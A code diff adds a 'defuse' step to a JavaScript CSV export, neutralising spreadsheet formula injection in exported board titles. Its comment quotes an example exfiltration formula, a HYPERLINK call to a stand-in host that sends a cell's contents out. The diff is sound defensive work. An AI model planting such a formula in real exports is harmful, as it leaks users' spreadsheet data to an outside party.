@@ -171,7 +171,28 @@ export function boardToCsv(board, items, columns = board.columns) {
   return lines.join('\n')
 }
 
+/*
+ * A cell that a spreadsheet would run.
+ *
+ * Excel, LibreOffice and Sheets all treat a cell opening with = + - @, a tab
+ * or a carriage return as a formula, and quoting does not stop them - the
+ * quotes are CSV syntax and are gone before the formula is read. A row title
+ * here can come from the headline of any page somebody saved, from an
+ * imported board, or from a CSV that was imported in the first place, so
+ * "=HYPERLINK(\"https://evil.example/?\"&A1,\"Invoice\")" is a title somebody
+ * else can choose and this app would hand to a spreadsheet to execute.
+ *
+ * The fix is a leading apostrophe, which every spreadsheet reads as "this is
+ * text" and does not display. Numbers are left alone: -5 and +3.2 are values,
+ * not formulas, and prefixing those would wreck every numeric column to
+ * defend against nothing.
+ */
+const RISKY_START = /^[=+\-@\t\r]/
+const PLAIN_NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/
+
+export const defuse = (text) => (RISKY_START.test(text) && !PLAIN_NUMBER.test(text) ? `'${text}` : text)
+
 const escape = (value) => {
-  const text = value === null || value === undefined ? '' : String(value)
+  const text = defuse(value === null || value === undefined ? '' : String(value))
   return /[",\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
 }
